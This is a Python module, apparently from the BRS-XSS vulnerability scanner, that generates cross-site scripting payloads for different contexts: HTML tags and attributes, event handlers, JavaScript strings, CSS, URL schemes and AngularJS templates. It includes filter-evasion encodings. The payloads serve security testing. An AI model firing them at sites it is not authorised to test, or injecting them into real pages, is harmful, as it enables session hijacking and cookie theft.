#!/usr/bin/env python3

"""
BRS-XSS Context Payloads

Context-specific payload generators.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Modified: Sun 10 Aug 2025 19:31:00 UTC
Telegram: https://t.me/EasyProTech
"""

from typing import Any, Mapping
from brsxss.utils.logger import Logger

logger = Logger("core.context_payloads")


class ContextPayloadGenerator:
    """Generates context-specific XSS payloads"""

    def get_html_content_payloads(self) -> list[str]:
        """Get HTML content context payloads"""
        return [
            "<script>alert(1)</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            '<script>eval("alert(1)")</script>',
            '<script>setTimeout("alert(1)",0)</script>',
            '<script>Function("alert(1)")()</script>',
            '<script>[].constructor.constructor("alert(1)")()</script>',
            "<img src=x onerror=alert(1)>",
            '<img src=x onerror="alert(1)">',
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<svg onload=alert(1)>",
            '<svg onload="alert(1)">',
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<video controls oncanplay=alert(1)><source src=x>",
            "<audio controls oncanplay=alert(1)><source src=x>",
            "<input autofocus onfocus=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
            "<keygen autofocus onfocus=alert(1)>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
        ]

    def get_html_attribute_payloads(self, context_info: Mapping[str, Any]) -> list[str]:
        """Get HTML attribute context payloads"""
        quote_char = context_info.get("quote_char", '"')
        attr_name = context_info.get("attribute_name", "").lower()
        is_in_event_handler = context_info.get("is_in_event_handler", False)
        is_in_function_call = context_info.get("is_in_function_call", False)

        payloads = []

        # Event handler attributes (onload, onclick, onerror, etc.)
        # These contain JavaScript code, need JS string breakout payloads
        if attr_name.startswith("on") or is_in_event_handler:
            # For event handlers like: onload="startTimer('USER_INPUT');"
            # We need to break out of the JS string AND neutralize the tail
            if quote_char == '"':
                # Inside double-quoted attribute with single-quoted JS string
                payloads.extend([
                    "');alert(1);//",
                    "');alert(document.domain);//",
                    "');confirm(1);//",
                    "');prompt(1);//",
                    "'));alert(1);//",  # Double close for nested calls
                    "',alert(1));//",   # Comma operator
                    "'+alert(1)+('",    # Expression-based
                ])
            else:
                # Inside single-quoted attribute
                payloads.extend([
                    '");alert(1);//',
                    '");alert(document.domain);//',
                    '");confirm(1);//',
                    '"));alert(1);//',
                    '",alert(1));//',
                    '"+alert(1)+("',
                ])
            
            # HTML entity encoded versions (browser decodes before JS execution)
            payloads.extend([
                "&#39;);alert(1);//",      # &#39; = '
                "&#x27;);alert(1);//",     # &#x27; = '
                "&apos;);alert(1);//",     # &apos; = '
                "&#34;);alert(1);//",      # &#34; = "
                "&#x22;);alert(1);//",     # &#x22; = "
            ])
            
            # If we know it's a function call context
            if is_in_function_call:
                payloads.extend([
                    "');alert(1);('",      # Balance quotes
                    "');alert(1);var x='", # Variable assignment
                ])

        # Standard quote escape payloads (break out of attribute)
        if quote_char == '"':
            payloads.extend(
                [
                    '"><script>alert(1)</script>',
                    '" onmouseover="alert(1)',
                    '" autofocus onfocus="alert(1)',
                    '" onload="alert(1)',
                    '" onerror="alert(1)',
                    '" onclick="alert(1)',
                ]
            )
        else:
            payloads.extend(
                [
                    "'><script>alert(1)</script>",
                    "' onmouseover='alert(1)",
                    "' autofocus onfocus='alert(1)",
                    "' onload='alert(1)",
                    "' onerror='alert(1)",
                    "' onclick='alert(1)",
                ]
            )

        # Attribute-specific payloads
        if attr_name in ["src", "href", "action"]:
            payloads.extend(
                [
                    "javascript:alert(1)",
                    "data:text/html,<script>alert(1)</script>",
                    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                ]
            )

        return payloads

    def get_javascript_payloads(self) -> list[str]:
        """Get JavaScript context payloads"""
        return [
            "alert(1)",
            "alert(String.fromCharCode(88,83,83))",
            "alert(document.domain)",
            "alert(document.cookie)",
            'console.log("XSS")',
            "prompt(1)",
            "confirm(1)",
            'eval("alert(1)")',
            'setTimeout("alert(1)",0)',
            'setInterval("alert(1)",0)',
            'Function("alert(1)")()',
            'constructor.constructor("alert(1)")()',
            '[].constructor.constructor("alert(1)")()',
            "alert.call(null,1)",
            "alert.apply(null,[1])",
            'window["alert"](1)',
            'self["alert"](1)',
            'top["alert"](1)',
            'parent["alert"](1)',
            'globalThis["alert"](1)',
        ]

    def get_js_string_payloads(self, context_info: Mapping[str, Any]) -> list[str]:
        """
        Get JavaScript string context payloads.
        
        All payloads end with // to neutralize the tail of the template.
        For example: startTimer('{{ timer }}');
        Payload: ');alert(1);//
        Result: startTimer('');alert(1);//');
        The // comments out the remaining '); making it syntactically valid.
        """
        quote_char = context_info.get("quote_char", '"')
        is_in_function_call = context_info.get("is_in_function_call", False)
        is_in_event_handler = context_info.get("is_in_event_handler", False)
        
        payloads = []
        
        # Primary payloads - close string, close function call (if any), execute, comment tail
        if is_in_function_call or is_in_event_handler:
            # For function calls like: func('USER_INPUT');
            # Need to close: ' + ) + ; then execute + comment
            payloads.extend([
                f"{quote_char});alert(1);//",
                f"{quote_char});alert(document.domain);//",
                f"{quote_char});confirm(1);//",
                f"{quote_char});prompt(1);//",
                f"{quote_char});console.log(1);//",
                # Variations with different closures
                f"{quote_char}));alert(1);//",  # Double close for nested calls
                f"{quote_char},alert(1));//",   # Comma operator inside call
                f"{quote_char})+alert(1);//",   # Expression after close
            ])
        
        # Standard string breakout payloads - all with tail neutralization
        payloads.extend([
            # Basic breakout with comment
            f"{quote_char};alert(1);//",
            f"{quote_char};alert(document.domain);//",
            f"{quote_char};confirm(1);//",
            f"{quote_char};prompt(1);//",
            
            # Expression-based (for cases where ; might be filtered)
            f"{quote_char}+alert(1)+{quote_char}",
            f"{quote_char}-alert(1)-{quote_char}",
            f"{quote_char}*alert(1)*{quote_char}",
            f"{quote_char}||alert(1)||{quote_char}",
            f"{quote_char}&&alert(1)&&{quote_char}",
            
            # With variable assignment to balance
            f"{quote_char};alert(1);var x={quote_char}",
            f"{quote_char};alert(1);let x={quote_char}",
            
            # Newline-based (URL encoded)
            f"{quote_char}%0aalert(1)//",
            f"{quote_char}%0dalert(1)//",
            f"{quote_char}%0a%0dalert(1)//",
            
            # With comment insertion
            f"{quote_char}/**/;alert(1);//",
            f"{quote_char};/**/alert(1);//",
            
            # Advanced execution methods
            f'{quote_char};eval("alert(1)");//',
            f'{quote_char};setTimeout("alert(1)",0);//',
            f'{quote_char};setInterval("alert(1)",1);//',
            f'{quote_char};Function("alert(1)")();//',
            f'{quote_char};[].constructor.constructor("alert(1)")();//',
            
            # Unicode/hex escapes
            f"{quote_char}\\x3balert(1);//",
            f"{quote_char}\\u003balert(1);//",
            f"{quote_char}\\073alert(1);//",
            
            # HTML entity encoded (for HTML attribute context)
            f"{quote_char}&#x27;);alert(1);//",
            f"{quote_char}&#39;);alert(1);//",
        ])
        
        return payloads

    def get_css_payloads(self) -> list[str]:
        """Get CSS context payloads"""
        return [
            "expression(alert(1))",
            'expression(alert("XSS"))',
            'expression(eval("alert(1)"))',
            "expression(window.alert(1))",
            "url(javascript:alert(1))",
            'url("javascript:alert(1)")',
            "url('javascript:alert(1)')",
            "url(data:text/html,<script>alert(1)</script>)",
            "/**/expression(alert(1))/**/",
            "\\65 xpression(alert(1))",
            "\\000065 xpression(alert(1))",
            "\\45 xpression(alert(1))",
            "expr\\65 ssion(alert(1))",
            "expre\\73 sion(alert(1))",
            "expression\\28 alert(1)\\29",
        ]

    def get_url_payloads(self) -> list[str]:
        """Get URL parameter context payloads"""
        return [
            "javascript:alert(1)",
            "javascript:alert(String.fromCharCode(88,83,83))",
            'javascript:eval("alert(1)")',
            'javascript:setTimeout("alert(1)",0)',
            'javascript:Function("alert(1)")()',
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "vbscript:alert(1)",
            'about:blank">alert(1)',
            "wyciwyg://alert(1)",
            "feed:javascript:alert(1)",
            "firefoxurl:javascript:alert(1)",
            "opera:javascript:alert(1)",
            "moz-icon:javascript:alert(1)",
            "resource:javascript:alert(1)",
        ]

    def get_angular_template_payloads(self) -> list[str]:
        """Get AngularJS template expression payloads"""
        return [
            '{{constructor.constructor("alert(1)")()}}',
            '{{$eval.constructor("alert(1)")()}}',
            '{{$new.constructor("alert(1)")()}}',
            '{{$on.constructor("alert(1)")()}}',
            "{{constructor.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()}}",
            "{{$eval.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()}}",
            "{{$new.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()}}",
            "{{constructor.constructor(\"eval('alert(1)')\")()}}",
            "{{$eval.constructor(\"eval('alert(1)')\")()}}",
            "{{$new.constructor(\"eval('alert(1)')\")()}}",
            '{{$eval("alert(1)")}}',
            '{{$eval.constructor("alert")(1)}}',
            '{{$eval.constructor("alert")(String.fromCharCode(49))}}',
        ]

    def get_generic_payloads(self) -> list[str]:
        """Get generic payloads for unknown context"""
        return [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            '"><svg onload=alert(1)>',
            "'><svg onload=alert(1)>",
            "javascript:alert(1)",
            ";alert(1);//",
            "';alert(1);//",
            '";alert(1);//',
            "</script><script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
        ]

    def get_context_payloads(
        self, context_type: str, context_info: Mapping[str, Any]
    ) -> list[str]:
        """
        Get payloads for specific context.

        Args:
            context_type: Type of context
            context_info: Additional context information

        Returns:
            list of context-appropriate payloads
        """
        logger.debug(f"Getting payloads for context: {context_type}")

        context_map = {
            "html_content": self.get_html_content_payloads,
            "html_attribute": lambda: self.get_html_attribute_payloads(context_info),
            "javascript": self.get_javascript_payloads,
            "js_string": lambda: self.get_js_string_payloads(context_info),
            "css_style": self.get_css_payloads,
            "url_parameter": self.get_url_payloads,
            "angular_template": self.get_angular_template_payloads,
            "unknown": self.get_generic_payloads,
        }

        generator_func = context_map.get(context_type, self.get_generic_payloads)
        payloads = generator_func()

        logger.debug(f"Generated {len(payloads)} context payloads")
        return payloads
